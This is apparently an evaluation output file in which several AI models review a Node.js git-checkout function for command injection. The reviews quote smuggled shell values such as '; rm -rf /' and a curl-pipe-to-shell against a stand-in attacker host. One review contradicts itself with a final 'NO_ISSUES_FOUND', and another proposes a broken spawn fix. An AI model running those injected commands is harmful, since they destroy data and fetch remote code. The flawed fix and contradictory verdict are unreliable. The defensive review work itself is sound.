@@ -1,0 +1,112 @@
+{
+  "version": "0.1.0",
+  "timestamp": "2026-09-14T21:12:18.283080Z",
+  "config": {
+    "models_requested": 1,
+    "min_responses": 4,
+    "timeout_seconds": 300,
+    "strict": false
+  },
+  "summary": {
+    "task_hash": "80f1be20e84a",
+    "responses_received": 5,
+    "distinct_models": 4,
+    "responses_failed": 0,
+    "total_latency_ms": 22391
+  },
+  "warning": "1 response(s) came from an already-seated model or vendor",
+  "error": null,
+  "consensus": [
+    {
+      "agreement": 4,
+      "severity": "CRITICAL",
+      "category": "INJECTION",
+      "symbol": "checkoutBranch",
+      "title": "Command injection via unescaped parameters",
+      "models": [
+        "inclusionai/ling-3.0-flash-vl:free",
+        "nex-agi/nex-n2.5-mini:free",
+        "nvidia/nemotron-3-super-120b-a12b:free",
+        "poolside/laguna-xs-2.1:free"
+      ],
+      "severities": {
+        "CRITICAL": 4
+      },
+      "disputed": false
+    },
+    {
+      "agreement": 2,
+      "severity": "WARNING",
+      "category": "ERROR_HANDLING",
+      "symbol": "checkoutBranch",
+      "title": "stderr is silently discarded",
+      "models": [
+        "inclusionai/ling-3.0-flash-vl:free",
+        "poolside/laguna-xs-2.1:free"
+      ],
+      "severities": {
+        "WARNING": 2
+      },
+      "disputed": false
+    }
+  ],
+  "responses": [
+    {
+      "model": "openrouter/inclusionai/ling-3.0-flash-vl:free",
+      "served_model": "inclusionai/ling-3.0-flash-vl:free",
+      "served_provider": "Novita",
+      "content": "[CRITICAL] [INJECTION] Command injection via unescaped parameters (checkoutBranch)\n- Issue: Both `repoPath` and `branch` are interpolated directly into a shell command string via template literal. A caller passing `branch = \"; rm -rf /\"` or `repoPath = \"/tmp; rm -rf /\"` causes arbitrary shell execution. This is exploitable at any call site that accepts user-controlled or untrusted input for either parameter.\n- Fix: Replace `exec` with `execFile` and pass arguments as an array, which bypasses the shell entirely: `execFile(\"git\", [\"checkout\", branch], { cwd: repoPath }, (err, stdout) => cb(err, stdout));`\n\n[WARNING] [ERROR_HANDLING] stderr is silently discarded (checkoutBranch)\n- Issue: The `exec` callback receives `err` and `stdout` but not `stderr`. When `git checkout` fails (e.g., branch doesn't exist, merge conflict), the descriptive error message written to stderr is lost. Debugging any failed checkout becomes impossible without reproducing it manually.\n- Fix: Add a `stderr` parameter to the callback: `(err, stdout, stderr) => cb(err, stdout, stderr)`, or at minimum include `stderr` in the error passed to `cb`.\n\nNO_ISSUES_FOUND: Correct, safe, well-structured, and no simpler version is worth the change.",
+      "finish_reason": "stop",
+      "truncated": false,
+      "latency_ms": 8304,
+      "duplicate_of": null
+    },
+    {
+      "model": "openrouter/poolside/laguna-xs-2.1:free",
+      "served_model": "poolside/laguna-xs-2.1:free",
+      "served_provider": "Poolside",
+      "content": "* [CRITICAL] INJECTION checkoutBranch() function vulnerable to command injection via repoPath and branch parameters (at checkoutBranch function)\n  - Issue: The function directly interpolates repoPath and branch into a shell command without any sanitization or quoting. An attacker controlling either parameter can inject arbitrary commands. For example, branch = \"main; rm -rf /\" would execute the destructive command after the git checkout.\n  - Fix: Use execFile() with an argument array to avoid shell interpretation, or properly escape the inputs using a library like shell-escape.\n\n* [WARNING] ERROR_HANDLING checkoutBranch() ignores stderr and doesn't pass it to callback (at checkoutBranch function)\n  - Issue: The callback only receives err and stdout, but git commands can output important information to stderr even on success (e.g., branch rename warnings, permission notices). Callers lose visibility into these messages.\n  - Fix: Pass stderr to the callback: `exec(..., (err, stdout, stderr) => cb(err, stdout, stderr))`",
+      "finish_reason": "stop",
+      "truncated": false,
+      "latency_ms": 9784,
+      "duplicate_of": null
+    },
+    {
+      "model": "openrouter/nvidia/nemotron-3-super-120b-a12b:free",
+      "served_model": "nvidia/nemotron-3-super-120b-a12b:free",
+      "served_provider": "Nvidia",
+      "content": "* [CRITICAL] INJECTION Command injection via repoPath and branch (at checkoutBranch)\n    - Issue: The function directly interpolates `repoPath` and `branch` into a shell command string passed to `exec`. If an attacker controls either input (e.g., supplying a branch name like `; rm -rf /` or a repo path containing backticks or `$()`), they can execute arbitrary commands on the host, leading to full system compromise.\n    - Fix: Avoid shell interpolation by using `execFile` (or `spawn`) with an argument array and specify the working directory via the options object: `execFile('git', ['checkout', branch], {cwd: repoPath}, cb);`. This passes arguments directly to the git binary without invoking a shell.",
+      "finish_reason": "stop",
+      "truncated": false,
+      "latency_ms": 10168,
+      "duplicate_of": null
+    },
+    {
+      "model": "openrouter/nex-agi/nex-n2.5-mini:free",
+      "served_model": "nex-agi/nex-n2.5-mini:free",
+      "served_provider": "Nex AGI",
+      "content": "* [CRITICAL] [INJECTION] Shell command injection through repository path and branch (checkoutBranch)\n  - Issue: `exec` invokes `/bin/sh`, while both `repoPath` and `branch` are interpolated into the command. A caller-supplied value such as `repoPath=\"/tmp/repo; rm -rf /\"` or `branch=\"main; curl attacker/payload | sh\"` executes arbitrary shell commands. A branch beginning with `-` can also be interpreted as a Git option unless prefixed with `--`; validating branch names would not reliably contain all shell metacharacters.\n  - Fix: Use `execFile(\"git\", [\"checkout\", \"--\", branch], { cwd: repoPath }, cb)` so values remain arguments and Git options cannot be injected.",
+      "finish_reason": "stop",
+      "truncated": false,
+      "latency_ms": 3247,
+      "duplicate_of": null
+    },
+    {
+      "model": "openrouter/nvidia/nemotron-3-nano-omni-30b-a3b-reasoning:free",
+      "served_model": "nvidia/nemotron-3-nano-omni-30b-a3b-reasoning:free",
+      "served_provider": "Nvidia",
+      "content": "* [CRITICAL] INJECTION <Shell command injection via unescaped repoPath and branch in checkoutBranch> (at exec call)\n- Issue: The command string interpolates repoPath and branch without quoting, allowing an attacker to inject arbitrary shell commands (e.g., repoPath = \"foo; rm -rf /\"). This can lead to remote code execution and data corruption.\n- Fix: Replace exec with child_process.spawn using separate arguments, e.g., `const { spawn } = require('child_process'); spawn('git', ['checkout', branch, '-C', repoPath], {stdio:'pipe'}, cb);`",
+      "finish_reason": "stop",
+      "truncated": false,
+      "latency_ms": 19136,
+      "duplicate_of": "nvidia/nemotron-3-super-120b-a12b:free"
+    }
+  ],
+  "errors": [],
+  "_eval": {
+    "snippet": "cmdinjection_git.js",
+    "exit_code": 0,
+    "wall_s": 22.8,
+    "duplicate_of_backfilled": true
+  }
+}
